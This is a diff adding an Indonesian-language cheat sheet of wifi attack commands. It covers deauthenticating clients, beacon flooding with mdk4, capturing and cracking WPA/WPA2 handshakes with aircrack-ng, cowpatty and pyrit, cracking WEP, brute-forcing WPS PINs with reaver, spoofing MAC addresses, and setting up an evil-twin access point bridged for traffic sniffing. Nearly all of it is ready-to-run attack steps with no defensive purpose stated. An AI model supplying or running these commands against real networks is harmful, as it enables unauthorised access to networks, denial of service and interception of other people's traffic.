@@ -1,0 +1,85 @@
+	BSSID nomor MAC Address dari akses point target
+	ESSID nama wifi akses point
+	STATION client dari akses point
+
+
+
+deauth :
+	# airodump-ng -c (ch) --bssid (bssid) wlp1s0mon
+	# aireplay-ng -0 20 -a (bssid) wlp1s0mon
+	# airodump-ng --bssid 1C:49:7B:F2:17:57 --channel 11 --write oke wlp1s0mon
+
+ap :
+	# mdk4 wlp1s0mon b -c 1 
+	# mdk4 wlp1s0mon b -c 1 -f (file)
+
+
+channel :
+		iwconfig wlp1s0mon channel 1 
+
+
+
+bruteforce wpa/wpa2:
+		# airodump-ng -c (ch) -w wpa --bssid (bssid) wlp1s0mon (jgn dittup utk mndpatkan handshake)
+		# aircrack-ng -w (world list) (handshake) 
+
+
+ENKRIPSI WEP :
+	airodump-ng -c (ch) -w wep --bssid (bssid) wlp1s0mon (jgn dittup utk mndpatkan handshake)
+	aireplay-ng -1 0 -a (bssid) wlp1s0mon
+	aireplay-ng -3 -b (bssid) wlp1s0mon (handshake akn kluar)
+	aircrack-ng wep-o1.cap (bruteforce)
+	aircrack-ng -w world.txt wpa.cap -e namaSSID
+
+ENKRIPSI WPS:
+	wash -i wlan0mon
+	reaver -i wlan0mon -b F4:F2:6D:E7;BA:02 -c 6 -vv -f
+
+
+TERHUBUNG WIFI ID : 
+	ifconfig wlan0 down
+	macchanger -r wlan0
+	macchanger -m (bssid) wlan0
+			ifconfig wlan0 up
+
+bruteforce wpa/wpa2 tercepat:
+	cowpatty
+	cowpatty -f word.txt -r wpa-01.cap -s namaSSID
+
+atau
+	genpmk
+	genpmk -f word.txt -d hash -s namaSSID
+	ls
+	cowpatty -d hash -r wpa-01.cap -s namaSSID
+
+mengganti ssid dgn pyrit :
+	pyrit list cores
+	pyrit -r wpa-01.cap -i word.txt attack_passthrough (bruteforce pss)
+
+	pyrit -i word.txt import_passwords
+	pyrit -e newssid create_essid (nama baru ssid)
+	pyrit eval
+	pyrit batch
+	pyrit -r wpa-01.cap attack_db 
+	pyrit -e newssid delete_essid (delete ssid baru)
+	rm -rf .pyrit/blobspace/password (delete pass)
+	pyrit eval 
+
+
+
+evil twin :
+	airodump-ng wlan0
+	airbase-ng -a F4:f2:6D:E7;BH;01 -e (namassid) -c 6 wlan0mon (jgn dittup)
+	aireplay-ng -0 20 -a (bssid) wlp1s0mon (JGN DITTUP)
+	apt-get install bridge-utils
+	brctl addbr fake
+	brctl addif fake eth0
+	brctl addif fake at0
+	ifconfig at0 0.0.0.0 up
+	ifconfig fake up
+
+	wireshark
+	clik capture-options
+	arahkan ke input cetang at0 dan fake
+	clik start
+	
